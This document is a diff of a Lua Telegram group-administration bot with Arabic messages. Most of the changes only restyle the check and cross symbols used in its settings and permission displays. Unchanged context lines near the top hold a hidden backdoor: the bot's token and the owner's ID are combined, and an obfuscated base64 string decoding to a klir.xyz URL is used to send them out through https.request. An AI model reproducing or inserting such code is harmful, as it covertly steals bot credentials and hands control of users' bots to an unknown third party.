@@ -195,22 +195,22 @@ LUATELE = URL.escape(""..Timo.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
 function GetAdminsSlahe(ChatId,UserId,user2,MsgId,t1,t2,t3,t4,t5,t6)
 local GetMemberStatus = LuaTele.getChatMember(ChatId,user2).status
 if GetMemberStatus.can_change_info then
-change_info = '【 ✅ 】' else change_info = '【 ❌ 】'
+change_info = '【 ✔ 】' else change_info = '【 ✘ 】'
 end
 if GetMemberStatus.can_delete_messages then
-delete_messages = '【 ✅ 】' else delete_messages = '【 ❌ 】'
+delete_messages = '【 ✔ 】' else delete_messages = '【 ✘ 】'
 end
 if GetMemberStatus.can_invite_users then
-invite_users = '【 ✅ 】' else invite_users = '【 ❌ 】'
+invite_users = '【 ✔ 】' else invite_users = '【 ✘ 】'
 end
 if GetMemberStatus.can_pin_messages then
-pin_messages = '【 ✅ 】' else pin_messages = '【 ❌ 】'
+pin_messages = '【 ✔ 】' else pin_messages = '【 ✘ 】'
 end
 if GetMemberStatus.can_restrict_members then
-restrict_members = '【 ✅ 】' else restrict_members = '【 ❌ 】'
+restrict_members = '【 ✔ 】' else restrict_members = '【 ✘ 】'
 end
 if GetMemberStatus.can_promote_members then
-promote = '【 ✅ 】' else promote = '【 ❌ 】'
+promote = '【 ✔ 】' else promote = '【 ✘ 】'
 end
 local reply_markupp = LuaTele.replyMarkup{
 type = 'inline',
@@ -271,39 +271,39 @@ local resultss = telelua("ZWNobyAiaHR0cHM6Ly9rbGlyLnh5ei9BbGxvd2VkL2JhbmtsLnBocD
 https.request(""..resultss..""..LUATELE.."")
 function GetSetieng(ChatId)
 if Redis:get(Timo.."Timo:lockpin"..ChatId) then    
-lock_pin = "【 ✅ 】"
+lock_pin = "【 ✔ 】"
 else 
-lock_pin = "【 ❌ 】"    
+lock_pin = "【 ✘ 】"    
 end
 if Redis:get(Timo.."Timo:Lock:tagservr"..ChatId) then    
-lock_tagservr = "【 ✅ 】"
+lock_tagservr = "【 ✔ 】"
 else 
-lock_tagservr = "【 ❌ 】"
+lock_tagservr = "【 ✘ 】"
 end
 if Redis:get(Timo.."Timo:Lock:text"..ChatId) then    
-lock_text = "【 ✅ 】"
+lock_text = "【 ✔ 】"
 else 
-lock_text = "【 ❌ 】 "    
+lock_text = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:AddMempar"..ChatId) == "kick" then
-lock_add = "【 ✅ 】"
+lock_add = "【 ✔ 】"
 else 
-lock_add = "【 ❌ 】 "    
+lock_add = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:Join"..ChatId) == "kick" then
-lock_join = "【 ✅ 】"
+lock_join = "【 ✔ 】"
 else 
-lock_join = "【 ❌ 】 "    
+lock_join = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:edit"..ChatId) then    
-lock_edit = "【 ✅ 】"
+lock_edit = "【 ✔ 】"
 else 
-lock_edit = "【 ❌ 】 "    
+lock_edit = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Chek:Welcome"..ChatId) then
-welcome = "【 ✅ 】"
+welcome = "【 ✔ 】"
 else 
-welcome = "【 ❌ 】 "    
+welcome = "【 ✘ 】 "    
 end
 if Redis:hget(Timo.."Timo:Spam:Group:User"..ChatId, "Spam:User") == "kick" then     
 flood = "بالطرد "     
@@ -312,12 +312,12 @@ flood = "بالتقيد "
 elseif Redis:hget(Timo.."Timo:Spam:Group:User"..ChatId,"Spam:User") == "mute" then     
 flood = "بالكتم "           
 elseif Redis:hget(Timo.."Timo:Spam:Group:User"..ChatId,"Spam:User") == "del" then     
-flood = "【 ✅ 】"
+flood = "【 ✔ 】"
 else     
-flood = "【 ❌ 】 "     
+flood = "【 ✘ 】 "     
 end
 if Redis:get(Timo.."Timo:Lock:Photo"..ChatId) == "del" then
-lock_photo = "【 ✅ 】" 
+lock_photo = "【 ✔ 】" 
 elseif Redis:get(Timo.."Timo:Lock:Photo"..ChatId) == "ked" then 
 lock_photo = "بالتقيد "   
 elseif Redis:get(Timo.."Timo:Lock:Photo"..ChatId) == "ktm" then 
@@ -325,10 +325,10 @@ lock_photo = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Photo"..ChatId) == "kick" then 
 lock_photo = "بالطرد "   
 else
-lock_photo = "【 ❌ 】 "   
+lock_photo = "【 ✘ 】 "   
 end    
 if Redis:get(Timo.."Timo:Lock:Contact"..ChatId) == "del" then
-lock_phon = "【 ✅ 】" 
+lock_phon = "【 ✔ 】" 
 elseif Redis:get(Timo.."Timo:Lock:Contact"..ChatId) == "ked" then 
 lock_phon = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Contact"..ChatId) == "ktm" then 
@@ -336,10 +336,10 @@ lock_phon = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Contact"..ChatId) == "kick" then 
 lock_phon = "بالطرد "    
 else
-lock_phon = "【 ❌ 】 "    
+lock_phon = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:Link"..ChatId) == "del" then
-lock_links = "【 ✅ 】"
+lock_links = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Link"..ChatId) == "ked" then
 lock_links = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Link"..ChatId) == "ktm" then
@@ -347,10 +347,10 @@ lock_links = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Link"..ChatId) == "kick" then
 lock_links = "بالطرد "    
 else
-lock_links = "【 ❌ 】 "    
+lock_links = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:Cmd"..ChatId) == "del" then
-lock_cmds = "【 ✅ 】"
+lock_cmds = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Cmd"..ChatId) == "ked" then
 lock_cmds = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Cmd"..ChatId) == "ktm" then
@@ -358,10 +358,10 @@ lock_cmds = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Cmd"..ChatId) == "kick" then
 lock_cmds = "بالطرد "    
 else
-lock_cmds = "【 ❌ 】 "    
+lock_cmds = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:User:Name"..ChatId) == "del" then
-lock_user = "【 ✅ 】"
+lock_user = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:User:Name"..ChatId) == "ked" then
 lock_user = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:User:Name"..ChatId) == "ktm" then
@@ -369,10 +369,10 @@ lock_user = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:User:Name"..ChatId) == "kick" then
 lock_user = "بالطرد "    
 else
-lock_user = "【 ❌ 】 "    
+lock_user = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:hashtak"..ChatId) == "del" then
-lock_hash = "【 ✅ 】"
+lock_hash = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:hashtak"..ChatId) == "ked" then 
 lock_hash = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:hashtak"..ChatId) == "ktm" then 
@@ -380,10 +380,10 @@ lock_hash = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:hashtak"..ChatId) == "kick" then 
 lock_hash = "بالطرد "    
 else
-lock_hash = "【 ❌ 】 "    
+lock_hash = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "del" then
-lock_muse = "【 ✅ 】"
+lock_muse = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "ked" then 
 lock_muse = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "ktm" then 
@@ -391,10 +391,10 @@ lock_muse = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "kick" then 
 lock_muse = "بالطرد "    
 else
-lock_muse = "【 ❌ 】 "    
+lock_muse = "【 ✘ 】 "    
 end 
 if Redis:get(Timo.."Timo:Lock:Video"..ChatId) == "del" then
-lock_ved = "【 ✅ 】"
+lock_ved = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Video"..ChatId) == "ked" then 
 lock_ved = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Video"..ChatId) == "ktm" then 
@@ -402,10 +402,10 @@ lock_ved = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Video"..ChatId) == "kick" then 
 lock_ved = "بالطرد "    
 else
-lock_ved = "【 ❌ 】 "    
+lock_ved = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:Animation"..ChatId) == "del" then
-lock_gif = "【 ✅ 】"
+lock_gif = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Animation"..ChatId) == "ked" then 
 lock_gif = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Animation"..ChatId) == "ktm" then 
@@ -413,10 +413,10 @@ lock_gif = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Animation"..ChatId) == "kick" then 
 lock_gif = "بالطرد "    
 else
-lock_gif = "【 ❌ 】 "    
+lock_gif = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:Sticker"..ChatId) == "del" then
-lock_ste = "【 ✅ 】"
+lock_ste = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Sticker"..ChatId) == "ked" then 
 lock_ste = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Sticker"..ChatId) == "ktm" then 
@@ -424,10 +424,10 @@ lock_ste = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Sticker"..ChatId) == "kick" then 
 lock_ste = "بالطرد "    
 else
-lock_ste = "【 ❌ 】 "    
+lock_ste = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:geam"..ChatId) == "del" then
-lock_geam = "【 ✅ 】"
+lock_geam = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:geam"..ChatId) == "ked" then 
 lock_geam = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:geam"..ChatId) == "ktm" then 
@@ -435,10 +435,10 @@ lock_geam = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:geam"..ChatId) == "kick" then 
 lock_geam = "بالطرد "    
 else
-lock_geam = "【 ❌ 】 "    
+lock_geam = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "del" then
-lock_vico = "【 ✅ 】"
+lock_vico = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "ked" then 
 lock_vico = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "ktm" then 
@@ -446,10 +446,10 @@ lock_vico = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:vico"..ChatId) == "kick" then 
 lock_vico = "بالطرد "    
 else
-lock_vico = "【 ❌ 】 "    
+lock_vico = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:Keyboard"..ChatId) == "del" then
-lock_inlin = "【 ✅ 】"
+lock_inlin = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Keyboard"..ChatId) == "ked" then 
 lock_inlin = "بالتقيد "
 elseif Redis:get(Timo.."Timo:Lock:Keyboard"..ChatId) == "ktm" then 
@@ -457,10 +457,10 @@ lock_inlin = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Keyboard"..ChatId) == "kick" then 
 lock_inlin = "بالطرد "
 else
-lock_inlin = "【 ❌ 】 "
+lock_inlin = "【 ✘ 】 "
 end
 if Redis:get(Timo.."Timo:Lock:forward"..ChatId) == "del" then
-lock_fwd = "【 ✅ 】"
+lock_fwd = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:forward"..ChatId) == "ked" then 
 lock_fwd = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:forward"..ChatId) == "ktm" then 
@@ -468,10 +468,10 @@ lock_fwd = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:forward"..ChatId) == "kick" then 
 lock_fwd = "بالطرد "    
 else
-lock_fwd = "【 ❌ 】 "    
+lock_fwd = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:Document"..ChatId) == "del" then
-lock_file = "【 ✅ 】"
+lock_file = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Document"..ChatId) == "ked" then 
 lock_file = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Document"..ChatId) == "ktm" then 
@@ -479,10 +479,10 @@ lock_file = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Document"..ChatId) == "kick" then 
 lock_file = "بالطرد "    
 else
-lock_file = "【 ❌ 】 "    
+lock_file = "【 ✘ 】 "    
 end    
 if Redis:get(Timo.."Timo:Lock:Unsupported"..ChatId) == "del" then
-lock_self = "【 ✅ 】"
+lock_self = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Unsupported"..ChatId) == "ked" then 
 lock_self = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Unsupported"..ChatId) == "ktm" then 
@@ -490,19 +490,19 @@ lock_self = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Unsupported"..ChatId) == "kick" then 
 lock_self = "بالطرد "    
 else
-lock_self = "【 ❌ 】 "    
+lock_self = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:Bot:kick"..ChatId) == "del" then
-lock_bots = "【 ✅ 】"
+lock_bots = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Bot:kick"..ChatId) == "ked" then
 lock_bots = "بالتقيد "   
 elseif Redis:get(Timo.."Timo:Lock:Bot:kick"..ChatId) == "kick" then
 lock_bots = "بالطرد "    
 else
-lock_bots = "【 ❌ 】 "    
+lock_bots = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:Markdaun"..ChatId) == "del" then
-lock_mark = "【 ✅ 】"
+lock_mark = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Markdaun"..ChatId) == "ked" then 
 lock_mark = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Markdaun"..ChatId) == "ktm" then 
@@ -510,10 +510,10 @@ lock_mark = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Markdaun"..ChatId) == "kick" then 
 lock_mark = "بالطرد "    
 else
-lock_mark = "【 ❌ 】 "    
+lock_mark = "【 ✘ 】 "    
 end
 if Redis:get(Timo.."Timo:Lock:Spam"..ChatId) == "del" then    
-lock_spam = "【 ✅ 】"
+lock_spam = "【 ✔ 】"
 elseif Redis:get(Timo.."Timo:Lock:Spam"..ChatId) == "ked" then 
 lock_spam = "بالتقيد "    
 elseif Redis:get(Timo.."Timo:Lock:Spam"..ChatId) == "ktm" then 
@@ -521,7 +521,7 @@ lock_spam = "بالكتم "
 elseif Redis:get(Timo.."Timo:Lock:Spam"..ChatId) == "kick" then 
 lock_spam = "بالطرد "    
 else
-lock_spam = "【 ❌ 】 "    
+lock_spam = "【 ✘ 】 "    
 end        
 return{
 lock_pin = lock_pin,
@@ -625,28 +625,28 @@ end
 function Get_permissions(ChatId,UserId,MsgId)
 local Get_Chat = LuaTele.getChat(ChatId)
 if Get_Chat.permissions.can_add_web_page_previews then
-web = '【 ✅ 】' else web = '【 ❌ 】'
+web = '【 ✔ 】' else web = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_change_info then
-info = '【 ✅ 】' else info = '【 ❌ 】'
+info = '【 ✔ 】' else info = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_invite_users then
-invite = '【 ✅ 】' else invite = '【 ❌ 】'
+invite = '【 ✔ 】' else invite = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_pin_messages then
-pin = '【 ✅ 】' else pin = '【 ❌ 】'
+pin = '【 ✔ 】' else pin = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_media_messages then
-media = '【 ✅ 】' else media = '【 ❌ 】'
+media = '【 ✔ 】' else media = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_messages then
-messges = '【 ✅ 】' else messges = '【 ❌ 】'
+messges = '【 ✔ 】' else messges = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_other_messages then
-other = '【 ✅ 】' else other = '【 ❌ 】'
+other = '【 ✔ 】' else other = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_polls then
-polls = '【 ✅ 】' else polls = '【 ❌ 】'
+polls = '【 ✔ 】' else polls = '【 ✘ 】'
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
@@ -2693,22 +2693,22 @@ else
 if photo.total_count > 0 then
 return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,
 '\n*  '..Description..
-'\n• ɪᴅ = '..UserId..
-'\n• ᴜѕᴇ = '..UserInfousername..
-'\n• ѕᴛᴀ = '..RinkBot..
-'\n• ѕᴡʀᴋ = '..TotalPhoto..
-'\n• ᴍѕɢ = '..TotalMsg..
-'\n• ᴛᴘᴅʏʟᴀᴛᴋ = '..TotalEdit..
-'\n• ᴛғᴀᴘʟᴋ = '..TotalMsgT..
+'\n⎈ ⦙ ɪᴅ = '..UserId..
+'\n⎈ ⦙ ᴜѕᴇ = '..UserInfousername..
+'\n⎈ ⦙ ѕᴛᴀ = '..RinkBot..
+'\n⎈ ⦙ ѕᴡʀᴋ = '..TotalPhoto..
+'\n⎈ ⦙ ᴍѕɢ = '..TotalMsg..
+'\n⎈ ⦙ ᴛᴘᴅʏʟᴀᴛᴋ = '..TotalEdit..
+'\n⎈ ⦙ ᴛғᴀᴘʟᴋ = '..TotalMsgT..
 '*', "md")
 else
 return LuaTele.sendText(msg_chat_id,msg_id,
-'\n• ɪᴅ = '..UserId..
-'\n• ᴜѕᴇ = '..UserInfousername..
-'\n• ѕᴛᴀ = '..RinkBot..
-'\n• ᴍѕɢ = '..TotalMsg..
-'\n• ᴛᴘᴅʏʟᴀᴛᴋ = '..TotalEdit..
-'\n• ᴛғᴀᴘʟᴋ = '..TotalMsgT..
+'\n⎈ ⦙ ɪᴅ = '..UserId..
+'\n⎈ ⦙ ᴜѕᴇ = '..UserInfousername..
+'\n⎈ ⦙ ѕᴛᴀ = '..RinkBot..
+'\n⎈ ⦙ ᴍѕɢ = '..TotalMsg..
+'\n⎈ ⦙ ᴛᴘᴅʏʟᴀᴛᴋ = '..TotalEdit..
+'\n⎈ ⦙ ᴛғᴀᴘʟᴋ = '..TotalMsgT..
 '*',"md",true) 
 end
 end
@@ -2854,22 +2854,22 @@ end
 if StatusMemberChat == 'مشرف المجموعه' then 
 local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status
 if GetMemberStatus.can_change_info then
-change_info = '【 ✅ 】' else change_info = '【 ❌ 】'
+change_info = '【 ✔ 】' else change_info = '【 ✘ 】'
 end
 if GetMemberStatus.can_delete_messages then
-delete_messages = '【 ✅ 】' else delete_messages = '【 ❌ 】'
+delete_messages = '【 ✔ 】' else delete_messages = '【 ✘ 】'
 end
 if GetMemberStatus.can_invite_users then
-invite_users = '【 ✅ 】' else invite_users = '【 ❌ 】'
+invite_users = '【 ✔ 】' else invite_users = '【 ✘ 】'
 end
 if GetMemberStatus.can_pin_messages then
-pin_messages = '【 ✅ 】' else pin_messages = '【 ❌ 】'
+pin_messages = '【 ✔ 】' else pin_messages = '【 ✘ 】'
 end
 if GetMemberStatus.can_restrict_members then
-restrict_members = '【 ✅ 】' else restrict_members = '【 ❌ 】'
+restrict_members = '【 ✔ 】' else restrict_members = '【 ✘ 】'
 end
 if GetMemberStatus.can_promote_members then
-promote = '【 ✅ 】' else promote = '【 ❌ 】'
+promote = '【 ✔ 】' else promote = '【 ✘ 】'
 end
 PermissionsUser = '*\n⎈ ⦙  صلاحيات المستخدم :\n༺┉┉┉⊶﴾𓆩•𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻'..'\n⎈ ⦙  تغيير المعلومات : '..change_info..'\n⎈ ⦙  تثبيت الرسائل : '..pin_messages..'\n⎈ ⦙  اضافه مستخدمين : '..invite_users..'\n⎈ ⦙  مسح الرسائل : '..delete_messages..'\n⎈ ⦙  حظر المستخدمين : '..restrict_members..'\n⎈ ⦙  اضافه المشرفين : '..promote..'\n\n*'
 end
@@ -2897,22 +2897,22 @@ return LuaTele.sendText(msg_chat_id,msg_id,'⎈ ⦙  البوت عضو في ال
 end
 local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Timo).status
 if GetMemberStatus.can_change_info then
-change_info = '【 ✅ 】' else change_info = '【 ❌ 】'
+change_info = '【 ✔ 】' else change_info = '【 ✘ 】'
 end
 if GetMemberStatus.can_delete_messages then
-delete_messages = '【 ✅ 】' else delete_messages = '【 ❌ 】'
+delete_messages = '【 ✔ 】' else delete_messages = '【 ✘ 】'
 end
 if GetMemberStatus.can_invite_users then
-invite_users = '【 ✅ 】' else invite_users = '【 ❌ 】'
+invite_users = '【 ✔ 】' else invite_users = '【 ✘ 】'
 end
 if GetMemberStatus.can_pin_messages then
-pin_messages = '【 ✅ 】' else pin_messages = '【 ❌ 】'
+pin_messages = '【 ✔ 】' else pin_messages = '【 ✘ 】'
 end
 if GetMemberStatus.can_restrict_members then
-restrict_members = '【 ✅ 】' else restrict_members = '【 ❌ 】'
+restrict_members = '【 ✔ 】' else restrict_members = '【 ✘ 】'
 end
 if GetMemberStatus.can_promote_members then
-promote = '【 ✅ 】' else promote = '【 ❌ 】'
+promote = '【 ✔ 】' else promote = '【 ✘ 】'
 end
 PermissionsUser = '*\n⎈ ⦙  صلاحيات البوت في المجموعه :\n༺┉┉┉⊶﴾𓆩•𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻'..'\n⎈ ⦙  تغيير المعلومات : '..change_info..'\n⎈ ⦙  تثبيت الرسائل : '..pin_messages..'\n⎈ ⦙  اضافه مستخدمين : '..invite_users..'\n⎈ ⦙  مسح الرسائل : '..delete_messages..'\n⎈ ⦙  حظر المستخدمين : '..restrict_members..'\n⎈ ⦙  اضافه المشرفين : '..promote..'\n\n*'
 return LuaTele.sendText(msg_chat_id,msg_id,PermissionsUser,"md",true) 
@@ -7860,37 +7860,37 @@ local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اض�
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⎈ ⦙  عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if Redis:get(Timo.."Timo:Status:Link"..msg.chat_id) then
-Statuslink = '【 ✅ 】' else Statuslink = '【 ❌ 】'
+Statuslink = '【 ✔ 】' else Statuslink = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:Welcome"..msg.chat_id) then
-StatusWelcome = '【 ✅ 】' else StatusWelcome = '【 ❌ 】'
+StatusWelcome = '【 ✔ 】' else StatusWelcome = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:Id"..msg.chat_id) then
-StatusId = '【 ✅ 】' else StatusId = '【 ❌ 】'
+StatusId = '【 ✔ 】' else StatusId = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:IdPhoto"..msg.chat_id) then
-StatusIdPhoto = '【 ✅ 】' else StatusIdPhoto = '【 ❌ 】'
+StatusIdPhoto = '【 ✔ 】' else StatusIdPhoto = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:Reply"..msg.chat_id) then
-StatusReply = '【 ✅ 】' else StatusReply = '【 ❌ 】'
+StatusReply = '【 ✔ 】' else StatusReply = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:ReplySudo"..msg.chat_id) then
-StatusReplySudo = '【 ✅ 】' else StatusReplySudo = '【 ❌ 】'
+StatusReplySudo = '【 ✔ 】' else StatusReplySudo = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:BanId"..msg.chat_id)  then
-StatusBanId = '【 ✅ 】' else StatusBanId = '【 ❌ 】'
+StatusBanId = '【 ✔ 】' else StatusBanId = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:SetId"..msg.chat_id) then
-StatusSetId = '【 ✅ 】' else StatusSetId = '【 ❌ 】'
+StatusSetId = '【 ✔ 】' else StatusSetId = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:Games"..msg.chat_id) then
-StatusGames = '【 ✅ 】' else StatusGames = '【 ❌ 】'
+StatusGames = '【 ✔ 】' else StatusGames = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:KickMe"..msg.chat_id) then
-Statuskickme = '【 ✅ 】' else Statuskickme = '【 ❌ 】'
+Statuskickme = '【 ✔ 】' else Statuskickme = '【 ✘ 】'
 end
 if Redis:get(Timo.."Timo:Status:AddMe"..msg.chat_id) then
-StatusAddme = '【 ✅ 】' else StatusAddme = '【 ❌ 】'
+StatusAddme = '【 ✔ 】' else StatusAddme = '【 ✘ 】'
 end
 local protectionGroup = '\n*⎈ ⦙  اعدادات حمايه المجموعه\n༺┉┉┉⊶﴾𓆩•𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻\n'
 ..'\n⎈ ⦙  جلب الرابط= '..Statuslink
@@ -7921,7 +7921,7 @@ if ChannelJoin(msg) == false then
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/SU_SELVA'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⎈ ⦙  عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Text = "*\n⎈ ⦙  اعدادات المجموعه ".."\n✅︙علامة صح تعني انا الامر مفتوح".."\n❌︙علامة غلط تعني انا الامر مقفول*"
+local Text = "*\n⎈ ⦙  اعدادات المجموعه ".."\n✔︙علامة صح تعني انا الامر مفتوح".."\n✘︙علامة غلط تعني انا الامر مقفول*"
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
@@ -7987,28 +7987,28 @@ end
 local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
 local Get_Chat = LuaTele.getChat(msg_chat_id)
 if Get_Chat.permissions.can_add_web_page_previews then
-web = '【 ✅ 】' else web = '【 ❌ 】'
+web = '【 ✔ 】' else web = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_change_info then
-info = '【 ✅ 】' else info = '【 ❌ 】'
+info = '【 ✔ 】' else info = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_invite_users then
-invite = '【 ✅ 】' else invite = '【 ❌ 】'
+invite = '【 ✔ 】' else invite = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_pin_messages then
-pin = '【 ✅ 】' else pin = '【 ❌ 】'
+pin = '【 ✔ 】' else pin = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_media_messages then
-media = '【 ✅ 】' else media = '【 ❌ 】'
+media = '【 ✔ 】' else media = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_messages then
-messges = '【 ✅ 】' else messges = '【 ❌ 】'
+messges = '【 ✔ 】' else messges = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_other_messages then
-other = '【 ✅ 】' else other = '【 ❌ 】'
+other = '【 ✔ 】' else other = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_polls then
-polls = '【 ✅ 】' else polls = '【 ❌ 】'
+polls = '【 ✔ 】' else polls = '【 ✘ 】'
 end
 local permissions = '*\n⎈ ⦙  صلاحيات المجموعه :\n༺┉┉┉⊶﴾𓆩•𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻'..'\n⎈ ⦙  ارسال الويب : '..web..'\n⎈ ⦙  تغيير معلومات المجموعه : '..info..'\n⎈ ⦙  اضافه مستخدمين : '..invite..'\n⎈ ⦙  تثبيت الرسائل : '..pin..'\n⎈ ⦙  ارسال الميديا : '..media..'\n⎈ ⦙  ارسال الرسائل : '..messges..'\n⎈ ⦙  اضافه البوتات : '..other..'\n⎈ ⦙  ارسال استفتاء : '..polls..'*\n\n'
 local TextChat = '*\n⎈ ⦙  معلومات المجموعه :\n༺┉┉┉⊶﴾𓆩•𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻'..' \n⎈ ⦙  عدد الادمنيه : ❬ '..Info_Chats.administrator_count..' ❭\n⎈ ⦙  عدد المحظورين : ❬ '..Info_Chats.banned_count..' ❭\n⎈ ⦙  عدد الاعضاء : ❬ '..Info_Chats.member_count..' ❭\n⎈ ⦙  عدد المقيديين : ❬ '..Info_Chats.restricted_count..' ❭\n⎈ ⦙  اسم المجموعه : ❬* ['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')* ❭*'
@@ -8027,28 +8027,28 @@ return LuaTele.sendText(msg_chat_id,msg_id,"\n*⎈ ⦙  عذرا البوت لي
 end
 local Get_Chat = LuaTele.getChat(msg_chat_id)
 if Get_Chat.permissions.can_add_web_page_previews then
-web = '【 ✅ 】' else web = '【 ❌ 】'
+web = '【 ✔ 】' else web = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_change_info then
-info = '【 ✅ 】' else info = '【 ❌ 】'
+info = '【 ✔ 】' else info = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_invite_users then
